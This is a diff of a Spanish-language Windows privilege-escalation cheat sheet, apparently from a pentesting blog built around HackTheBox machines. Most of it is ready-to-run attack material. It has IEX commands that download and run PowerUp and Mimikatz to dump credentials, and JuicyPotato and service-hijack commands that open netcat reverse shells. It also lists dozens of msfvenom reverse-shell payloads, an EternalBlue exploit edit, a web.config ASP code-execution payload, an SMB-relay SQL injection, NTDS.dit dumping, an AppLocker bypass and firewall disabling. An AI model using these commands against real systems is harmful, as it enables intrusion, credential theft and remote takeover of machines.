@@ -6,135 +6,154 @@ image: /assets/img/Post/WindowsC.jpg
 ## ENUMERACIÓN
 
 ¿Cual es el sistema operativo y que arquitectura tiene? ¿Le faltan parches?
+
 ```console
-intrusionz3r0@kali:~$ systeminfo
+C:\Windows\system32> systeminfo
 ```
 ¿Quién eres tú?
 ```console
-intrusionz3r0@kali:~$ whoami
-intrusionz3r0@kali:~$ echo %USERNAME%
-intrusionz3r0@kali:~$ $env:UserName
+C:\Windows\system32> whoami
+C:\Windows\system32> echo %USERNAME%
+```
+
+```powershell
+PS C:\Windows\system32> $env:UserName
 ```
 
 ¿Algún privilegio de usuario interesante?
 ```console
-intrusionz3r0@kali:~$ whoami /priv
-intrusionz3r0@kali:~$ whoami /all
+C:\Windows\system32> whoami /priv
+C:\Windows\system32> whoami /all
 ```
 
 ¿Qué usuarios están en el sistema?
 ```console
-intrusionz3r0@kali:~$ net users
-intrusionz3r0@kali:~$ dir /b /ad "C:\Users\"
-intrusionz3r0@kali:~$ dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+C:\Windows\system32> net users
+C:\Windows\system32> dir /b /ad "C:\Users\"
+C:\Windows\system32> dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+```
 
-intrusionz3r0@kali:~$ Get-LocalUser | ft Name,Enabled,LastLogon
-intrusionz3r0@kali:~$ Get-ChildItem C:\Users -Force | select Name
+```powershell
+PS C:\Windows\system32> Get-LocalUser | ft Name,Enabled,LastLogon
+PS C:\Windows\system32> Get-ChildItem C:\Users -Force | select Name
 ```
 
 ¿Qué grupos hay en el sistema?
 ```console
-intrusionz3r0@kali:~$ net localgroup
-intrusionz3r0@kali:~$ Get-LocalGroup | ft Name
+C:\Windows\system32> intrusionz3r0@kali:~$ net localgroup
+```
+
+```powershell
+PS C:\Windows\system32> intrusionz3r0@kali:~$ Get-LocalGroup | ft Name
 ```
 
 ¿Alguien más ha iniciado sesión?
 ```console
-intrusionz3r0@kali:~$ qwinsta
+C:\Windows\system32> qwinsta
 ```
 
 ¿Que usuarios pertenecen al grupo de administradores?
 ```console
-intrusionz3r0@kali:~$ net localgroup Administrators
-intrusionz3r0@kali:~$ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+C:\Windows\system32> net localgroup Administrators
+```
+
+```powershell
+PS C:\Windows\system32> Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 
 ¿Hay algunas credenciales en el winlogon?
 ```console
-intrusionz3r0@kali:~$ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
-intrusionz3r0@kali:~$ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+C:\Windows\system32> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+```
+
+```powershell
+PS C:\Windows\system32> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
 ```
 
 ¿Algo interesante en Credential Manager?
 ```console
-intrusionz3r0@kali:~$ cmdkey /list
-intrusionz3r0@kali:~$ dir C:\Users\username\AppData\Local\Microsoft\Credentials\
-intrusionz3r0@kali:~$ dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
-intrusionz3r0@kali:~$ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
-intrusionz3r0@kali:~$ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+C:\Windows\system32> cmdkey /list
+C:\Windows\system32> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+C:\Windows\system32> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
+
+```powershell
+PS C:\Windows\system32> Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+PS C:\Windows\system32> Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
 ¿Podemos acceder a los archivos SAM y SYSTEM?
+
 ```console
-intrusionz3r0@kali:~$ %SYSTEMROOT%\repair\SAM
-intrusionz3r0@kali:~$ %SYSTEMROOT%\System32\config\RegBack\SAM
-intrusionz3r0@kali:~$ %SYSTEMROOT%\System32\config\SAM
-intrusionz3r0@kali:~$ %SYSTEMROOT%\repair\system
-intrusionz3r0@kali:~$ %SYSTEMROOT%\System32\config\SYSTEM
-intrusionz3r0@kali:~$ %SYSTEMROOT%\System32\config\RegBack\system
+C:\Windows\system32> %SYSTEMROOT%\repair\SAM
+C:\Windows\system32> %SYSTEMROOT%\System32\config\RegBack\SAM
+C:\Windows\system32> %SYSTEMROOT%\System32\config\SAM
+C:\Windows\system32> %SYSTEMROOT%\repair\system
+C:\Windows\system32> %SYSTEMROOT%\System32\config\SYSTEM
+C:\Windows\system32> %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
 ¿Qué software está instalado?
 ```console
-intrusionz3r0@kali:~$ dir /a "C:\Program Files"
-intrusionz3r0@kali:~$ dir /a "C:\Program Files (x86)"
-intrusionz3r0@kali:~$ reg query HKEY_LOCAL_MACHINE\SOFTWARE
-intrusionz3r0@kali:~$ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
-intrusionz3r0@kali:~$ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+C:\Windows\system32> dir /a "C:\Program Files"
+C:\Windows\system32> dir /a "C:\Program Files (x86)"
+C:\Windows\system32> reg query HKEY_LOCAL_MACHINE\SOFTWARE
 ```
 
-Enumeración SMB.
+```powershell
+PS C:\Windows\system32> Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+PS C:\Windows\system32> Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+```
+
+## Enumeración SMB.
 
 ```console
-intrusionz3r0@kali:~$ smbmap -R -H \\<ip>
-intrusionz3r0@kali:~$ smbclient -L \\<ip> -N
-intrusionz3r0@kali:~$ \\<ip>\share -U <user>
-intrusionz3r0@kali:~$ smbget -R <ip>
+intrusionz3r0@kali:~$ smbmap -R -H \\[IP]
+intrusionz3r0@kali:~$ smbclient -L \\[IP] -N
+intrusionz3r0@kali:~$ \\[IP]\share -U [USER]
+intrusionz3r0@kali:~$ smbget -R smb:\\[IP]
 ```
+
+## Enumeración NFS y rpcbind.
+
+```console
+intrusionz3r0@kali:~$ rpcinfo irked.htb
+intrusionz3r0@kali:~$ mount -t nfs -o vers=2 [IP]:[RECURSO] [DESTINO]
+```
+
 
 Powershell PortScan.
 
-```console
-intrusionz3r0@kali:~$ 0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip>",$_)) "Port $_ is open!"} 2>$null
+```powershell
+PS C:\Windows\system32> 0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip>",$_)) "Port $_ is open!"} 2>$null
 ```
 
 ## SCRIPTS
 
 #### PowerUp.ps1
 
-```console
-intrusionz3r0@kali:~$ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/PowerUp.ps1');Invoke-AllChecks
+```powershell
+PS C:\Windows\system32> powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/PowerUp.ps1');Invoke-AllChecks
 ```
 #### Sherlock.ps1
 
-```console
-intrusionz3r0@kali:~$ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/Sherlock.ps1');Find-AllVulns
+```powershell
+PS C:\Windows\system32> powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://[IP]:PORT/Sherlock.ps1');Find-AllVulns
 ```
 
 #### Mimikatz.ps1
-```console
-intrusionz3r0@kali:~$ IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds
+```powershell
+PS C:\Windows\system32> IEX(New-Object Net.WebClient).downloadString('<url>/MimiKatz.ps1') ;Invoke-Mimikatz -DumpCreds
 ```
 
 #### Windows-Exploit-Suggester
-```console
+```powershell
 intrusionz3r0@kali:~$ ./windows-exploit-suggester.py --update
 intrusionz3r0@kali:~$ ./windows-exploit-suggester.py --database xxxx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt 
 ```
 
 
 ## EXPLOITS
-
-#### seImpersonateprivilege - JuicyPotato.exe
-
-
-> <https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe>
-
-```console
-intrusionz3r0@kali:~$ \\[IP]\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a " /C \\[IP]\smbFolder\nc.exe -e cmd [IP] [PUERTO]" -t *
-```
-> Si el CLSID no es el correcto puede buscarlo en el siguiente articulo: <https://ohpe.it/juicy-potato/CLSID/>
-  una vez lo encuentre insertelo en el comando de arriba con el parametro -c {CLSID}.
-
 
 #### EternalBlue (MS17-010).
 
@@ -218,17 +237,56 @@ intrusionz3r0@kali:~$ python send_and_execute.py [IP] eternalblue.exe 445 [PIPE]
 intrusionz3r0@kali:~$ python checker.py [IP]
 
 ```
-modificamos el archivo zzz_exploit.py
+Modificamos el método **smb_pwn()** del archivo `zzz_exploit.py`.
 
 ```python
-service_exec(conn, r'cmd /c {comando a ejecutar}')
+def smb_pwn(conn, arch):
+        #smbConn = conn.get_smbconnection() 
+        #print('creating file c:\\pwned.txt on the target')
+        #tid2 = smbConn.connectTree('C$')
+        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        #smbConn.closeFile(tid2, fid2)
+        #smbConn.disconnectTree(tid2) 
+        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+        service_exec(conn, r'cmd /c [Comando]')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by "msfvenom -f exe-service ..."
 ```
 
 ```console
 intrusionz3r0@kali:~$ python zzz_exploit.py [IP] [pipes]
 ```
 
-#### MS14-068 - Vulnerabilidad de Kerberos
+#### JuicyPotato.exe
+
+
+> <https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe>
+
+```powershell
+C:\Windows\system32> \\[IP]\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a " /C \\[IP]\smbFolder\nc.exe -e cmd [IP] [PUERTO]" -t *
+```
+> Si el CLSID no es el correcto puede buscarlo en el siguiente articulo: <https://ohpe.it/juicy-potato/CLSID/>
+  una vez lo encuentre insertelo en el comando de arriba con el parametro -c {CLSID}.
+
+#### Chimichurri.exe (MS10-059)
+
+Repositorio: [Chimichurri.exe](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled)
+
+```powershell
+C:\Windows\system32> Chimichurri.exe [IP] [PORT]
+```
+#### bfill.exe (MS16-098)
+
+Repositorio:: [MS16-098](https://github.com/sensepost/ms16-098).
+
+```powershell
+C:\Windows\system32> bfill.exe
+```
+
+
+
+####  Vulnerabilidad de Kerberos (MS14-068)
 
 > <https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py>
 
@@ -236,33 +294,180 @@ intrusionz3r0@kali:~$ python zzz_exploit.py [IP] [pipes]
 intrusionz3r0@kali:~$ python goldenPac.py domain.net/USER:PASS11@domain-host
 ```
 
+## MSFVENOM PAYLOADS.
 
-## SERVICIOS
-
-
+#### Listar payloads.
+```console
+intrusionz3r0@kali:~$ msfvenom -l | grep [plataforma]
 ```
-intrusionz3r0@kali:~$ sc start <nombre>
-intrusionz3r0@kali:~$ sc stop <nombre>
-intrusionz3r0@kali:~$ Start-Service -Name <nombre>
-intrusionz3r0@kali:~$ Stop-Service -Name <nombre> -Force
-intrusionz3r0@kali:~$ Get-Service -Name <nombre>
-intrusionz3r0@kali:~$ Get-Childitem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | where name -like "Servicio"
+
+#### Linux meterpreter reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev
+```
+#### Linux  reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev
+```
+
+#### Windows meterpreter reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe
+```
+
+#### Windows  reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > shell.exe
+```
+
+#### Mac meterpreter reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho
+```
+
+#### Android meterpreter reverse shell TCP
+
+```console
+intrusionz3r0@kali:~$ msfvenom –p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT]  > rev.apk
+```
+
+#### Android  reverse shell TCP
+
+```console
+intrusionz3r0@kali:~$ msfvenom –p android/shell/reverse_tcp LHOST=[IP] LPORT=[PORT]  > rev.apk
+```
+
+#### Mac  reverse shell TCP.
+```console
+intrusionz3r0@kali:~$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f macho > shell.macho
+```
+
+#### PHP Meterpreter Reverse TCP
+
+```console
+intrusionz3r0@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > shell.php 
+```
+#### PHP  Reverse TCP
+
+```console
+intrusionz3r0@kali:~$ msfvenom -p php/reverse_php LHOST=[IP] LPORT=[PORT] -f raw > shell.php 
+```
+
+#### ASP Meterpreter Reverse TCP
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > shell.asp
+```
+#### ASP  Reverse TCP
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > shell.asp
+```
+
+#### JSP  Reverse TCP
+```console
+intrusionz3r0@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > shell.jsp
+```
+#### WAR reverse TCP
+
+```console
+intrusionz3r0@kali:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f war > shell.war
+```
+#### Python Reverse Shell  
+```console
+intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw > shell.py
+```
+#### Bash Unix Reverse Shell  
+```console
+intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_bash LHOST=[IP] LPORT=[PORT] -f raw > shell.sh
+```
+
+#### Perl Unix Reverse shell  
+```console
+intrusionz3r0@kali:~$ msfvenom -p cmd/unix/reverse_perl LHOST=[IP] LPORT=[PORT] -f raw > shell.pl
+```
+
+#### Windows Meterpreter Reverse TCP Shellcode  
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
+```
+
+#### Linux Meterpreter Reverse TCP Shellcode  
+```console
+intrusionz3r0@kali:~$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
+```
+
+#### Mac Reverse TCP Shellcode  
+```console
+intrusionz3r0@kali:~$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f [Lenguaje]
+```
+
+#### Crear usuario.  
+```console
+intrusionz3r0@kali:~$ msfvenom -p windows/adduser USER=[USER] PASS=[PASS] -f exe > payload.exe
+```
+
+## RCE con archivos.
+
+#### RCE con web.config
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+   <appSettings>
+</appSettings>
+</configuration>
+<!–-
+<% Response.write("-"&"->")
+Response.write("<pre>")
+Set wShell1 = CreateObject("WScript.Shell")
+Set cmd1 = wShell1.Exec("ping 10.10.14.28")
+output1 = cmd1.StdOut.Readall()
+set cmd1 = nothing: Set wShell1 = nothing
+Response.write(output1)
+Response.write("</pre><!-"&"-") %>
+-–>
+```
+
+
+## SERVICIOS.
+
+```console
+C:\Windows\system32> sc start <nombre>
+C:\Windows\system32> sc stop <nombre>
+PS C:\Windows\system32> Start-Service -Name <nombre>
+PS C:\Windows\system32> Stop-Service -Name <nombre> -Force
+PS C:\Windows\system32>Get-Service -Name <nombre>
+PS C:\Windows\system32> Get-Childitem -recurse HKLM:\SYSTEM\CurrentControlSet\Services | where name -like "Servicio"
 ```
 
 #### UsoSvc Privilage Escalation.
 ```console
-intrusionz3r0@kali:~$ sc.exe stop UsoSvc
-intrusionz3r0@kali:~$ sc.exe config UsoSvc binpath= "cmd \c C:\Temp\nc.exe [IP] [PUERTO] -e cmd.exe"
-intrusionz3r0@kali:~$ sc.exe qc usosvc
-intrusionz3r0@kali:~$ sc.exe start UsoSvc
+C:\Windows\system32> sc.exe stop UsoSvc
+C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Temp\nc.exe [IP] [PUERTO] -e cmd.exe"
+C:\Windows\system32> sc.exe qc usosvc
+C:\Windows\system32> sc.exe start UsoSvc
 ```
 
 #### SecLogon Privilage Escalation.
 
 ```console
-intrusionz3r0@kali:~$ reg query HKLM\System\CurrentControlSet\Services\seclogon
-intrusionz3r0@kali:~$ reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\Temp\nc.exe [TUIP] [TUPUERTP] -e cmd.exe" /f
-intrusionz3r0@kali:~$ sc start seclogon
+C:\Windows\system32> reg query HKLM\System\CurrentControlSet\Services\seclogon
+C:\Windows\system32> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\seclogon" /t REG_EXPAND_SZ /v ImagePath /d "c:\Temp\nc.exe [TUIP] [TUPUERTP] -e cmd.exe" /f
+C:\Windows\system32> sc start seclogon
 ```
 
 
@@ -272,16 +477,16 @@ intrusionz3r0@kali:~$ sc start seclogon
  
 ```console
 intrusionz3r0@kali:~$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f dll > privesc.dll
-intrusionz3r0@kali:~$ dnscmd RESOLUTE.LOCAL /config /serverlevelplugindll \\PATH
-intrusionz3r0@kali:~$ sc stop dns
-intrusionz3r0@kali:~$ sc start dns
+C:\Windows\system32> dnscmd RESOLUTE.LOCAL /config /serverlevelplugindll \\PATH
+C:\Windows\system32> sc stop dns
+C:\Windows\system32> sc start dns
 ```
 #### AD Recycle Bin
 
 Recuperar objetos de un DC.
 
 ```console
-intrusionz3r0@kali:~$ Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects  -property *
+PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects  -property *
 ```
 
 #### Azure Admins
@@ -289,8 +494,8 @@ intrusionz3r0@kali:~$ Get-ADObject -filter 'isDeleted -eq $true -and name -ne "D
 > <https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1>
 
 ```console
-intrusionz3r0@kali:~$ Import-Module .\Azure-ADConnect.ps1
-intrusionz3r0@kali:~$ Azure-ADConnect -server [IP] -db ADSync
+C:\Windows\system32> Import-Module .\Azure-ADConnect.ps1
+C:\Windows\system32> Azure-ADConnect -server [IP] -db ADSync
 ```
 
 #### SeBackupPrivilege
@@ -313,11 +518,11 @@ $ diskshadow.exe /s C:\intrusion\priv.txt
 `#3 Transferimos los .dll,importamos los módulos, copiamos el ntds.dit y el SYSTEM.`
 
 ```console
-$ Import-Module .\SeBackupPrivilegeUtils.dll
-$ Import-Module .\SeBackupPrivilegeCmdLets.dll
-$ Set-SeBackupPrivilege
-$ Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit c:\intrusion\ntds.dit
-$ reg save HKLM\SYSTEM c:\intrusion\system
+PS C:\Windows\system32> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\Windows\system32> Import-Module .\SeBackupPrivilegeCmdLets.dll
+PS C:\Windows\system32> Set-SeBackupPrivilege
+PS C:\Windows\system32> Copy-FileSeBackupPrivilege x:\Windows\NTDS\ntds.dit c:\intrusion\ntds.dit
+PS C:\Windows\system32> reg save HKLM\SYSTEM c:\intrusion\system
 ```
 #### Dump NTDS.dit
 ```console
@@ -336,6 +541,9 @@ intrusionz3r0@kali:~$ GetUserSPNs.py -request -dc-ip [IP] DOMAIN/USER
 ```
 ```console
 intrusionz3r0@kali:~$ powershell.exe -Command 'IEX (New-Object Net.Webclient).DownloadString("http://[IP]:[PORT]/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat Hashcat
+```
+```console
+intrusionz3r0@kali:~$  cme ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting TGS-REP
 ```
 
 
@@ -369,127 +577,127 @@ intrusionz3r0@kali:~$ secretsdump.py -just-dc-ntlm MEGABANK.LOCAL/Administrator:
 `Una vez que tengas acceso como administrador.`
 
 ```console
-$ netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
-$ netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
-$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-& xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:[IP]
+C:\Windows\system32> netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
+C:\Windows\system32> netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=out localport=3389 action=allow
+C:\Windows\system32> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+C:\Windows\system32> xfreerdp /u:USER /d:DOMAIN /p:PASSWORD /v:[IP]
 ```
 
 
-## CAMBIAR DE USUARIO POWERSHELL
+## CAMBIAR DE USUARIO POWERSHELL.
 
-```console
-$ $username = 'batman'
-$ $password = 'Zx^#QZX+T!123'
-$ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$ $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-$ enter-pssession -computername arkham -credential $credential
+```powershell
+PS C:\Windows\system32> $username = 'batman'
+PS C:\Windows\system32> $password = 'Zx^#QZX+T!123'
+PS C:\Windows\system32> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\Windows\system32> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS C:\Windows\system32> enter-pssession -computername arkham -credential $credential
 ```
 
+## EJECUTAR COMANDOS CON OTRO USUARIO POWERSHELL.
 
-```console
-$ $user = 'DOMAIN\USER'
-$ $pw = 'PASSWORD'
-$ $secpw = ConvertTo-SecureString $pw -AsPlainText -Force
-$ $cred = New-Object System.Management.Automation.PSCredential $user,$secpw
-$ Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\Temp\nc.exe [TUIP] [TUPORT]}
+```powershell
+PS C:\Windows\system32> $user = 'DOMAIN\USER'
+PS C:\Windows\system32> $pw = 'PASSWORD'
+PS C:\Windows\system32> $secpw = ConvertTo-SecureString $pw -AsPlainText -Force
+PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential $user,$secpw
+PS C:\Windows\system32> Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {c:\Temp\nc.exe [TUIP] [TUPORT]}
 ```
 
-## DESCARGA DE ARCHIVOS
+## DESCARGA DE ARCHIVOS.
 
 ```console
-$ certutil.exe -f -urlcache -split http://[IP]/archivo archivo
-```
-
-```console
-$ powershell IEX(New-Object Net-WebClient).downloadFile('http://[IP]/archivo','C:\Temp\archivo')
+C:\Windows\system32> certutil.exe -f -urlcache -split http://[IP]/archivo archivo
 ```
 
 ```console
-$ copy \\[IP]\Recurso\archivo
+C:\Windows\system32> powershell IEX(New-Object Net-WebClient).downloadFile('http://[IP]/archivo','C:\Temp\archivo')
 ```
 
 ```console
-$ IWR -URI http://[IP]/archivo -OutFile archivo
+C:\Windows\system32> copy \\[IP]\Recurso\archivo
 ```
 
 ```console
-$ Invoke-WebRequest http://[IP]/archivo -OutFile archivo
+C:\Windows\system32> IWR -URI http://[IP]/archivo -OutFile archivo
 ```
 
-#### Descarga e interpreta.
-```console
-$ powershell IEX(New-Object Net-WebClient).downloadString('http://[IP]/archivo.ps1')
+```powershell
+C:\Windows\system32> Invoke-WebRequest http://[IP]/archivo -OutFile archivo
 ```
-`Recuerda poner el nombre de la funcion que quieras invocar al final del script}`
+
+## Descarga e interpreta.
+```console
+C:\Windows\system32> powershell IEX(New-Object Net-WebClient).downloadString('http://[IP]/archivo.ps1')
+```
+`Recuerda poner el nombre de la funcion que quieras invocar al final del script`
 
 
 ## POWERSHELL NATIVA
 ```console
-$ C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')
+C:\Windows\system32> C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')
 ```
 
-#### Historial de Powershell
+## Historial de Powershell
 
-> C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
-
+```console
+C:\Windows\system32> type C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+```
 
 ## FIREWALL
 Listar reglas de firewall.
 ```console
-$ netsh advfirewall firewall show rule name=all
+C:\Windows\system32> netsh advfirewall firewall show rule name=all
 ```
 Desactivar Firewall
 ```console
-$ netsh Advfirewall set allprofiles state off
+C:\Windows\system32> netsh Advfirewall set allprofiles state off
 ```
 
 ## PORT FORWARDING
 
 ```console
-# plink.exe -l root -pw [TUPASSWORD] -R 445:127.0.0.1:445 [TUIP]
+C:\Windows\system32> plink.exe -l root -pw [TUPASSWORD] -R 445:127.0.0.1:445 [TUIP]
 ```
 
 ```console
-$  ssh -R [TUPUERTO]:localhost:80 user@[IP]
+C:\Windows\system32>  ssh -R [TUPUERTO]:localhost:80 user@[IP]
 ```
 
 ## APPLOCKER BYPASS MSBuild
 
 ```console
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[TUIP] LPORT=[TUPUERTO] -f csharp -e x86/shikata_ga_nai -i [NUM] > output.cs
+intrusionz3r0@kali:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[TUIP] LPORT=[TUPUERTO] -f csharp -e x86/shikata_ga_nai -i [NUM] > output.cs
 ```
 > <https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml>
 
 ```console
-$ C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\file.csproj
+C:\Windows\system32> C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\file.csproj
 ```
 
 ## UAC
 
 ```console
-$ $executioncontext.sessionstate.languagemode 
+C:\Windows\system32> $executioncontext.sessionstate.languagemode 
 ```
 
-```console
-$  (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
+```powershell
+C:\Windows\system32> (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
 ```
 
 
-#### SMB Relay via MSSQL
+## SMB Relay via MSSQL
 
 Encendemos el reponder
 
 ```console
-$ responder -I tun0  -r -d -w -v
+C:\Windows\system32> responder -I tun0  -r -d -w -v
 ```
 
 > http://example.com/mvc/Product.aspx?ProductSubCategoryId=28;declare @q varchar(99);set @q='\\[IP]\test';exec master.dbo.xp_dirtree @q
 
-```
+```console
 [SMB] NTLMv2-SSP Client   : x.x.x.x
 [SMB] NTLMv2-SSP Username : example\example
 [SMB] NTLMv2-SSP Hash     : Exapme::example:3836b33745f3a34e:5C9090CA87239EDC83EBECFD1C8DE863:0101000000000000C0653150DE09D2016F7D1FB2C317EC3D000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000005690C5FD3744C7EFC6832CDAA32270D100257A53238D9C45FD1E1BEDD27C53B00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E003300370000000000000000000000000
 ```
-
-
